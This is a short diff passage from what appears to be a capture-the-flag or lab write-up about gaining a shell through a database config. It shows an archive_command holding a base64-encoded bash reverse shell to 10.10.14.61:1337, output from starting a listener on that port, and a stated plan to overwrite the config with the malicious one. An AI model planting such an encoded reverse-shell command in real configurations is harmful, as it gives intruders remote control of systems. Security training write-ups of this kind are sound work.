@@ -286,3 +286,13 @@ archive_command = 'echo "YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjYxLzEzMzcgPCYxCg=
 
 Then ill append it to the file
 
+```python
+penelope -p 1337
+[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.128 • 10.10.14.61
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+```
+
+Ill start a listener
+
+Now the next step is to overwrite the current config with my malicious one
+
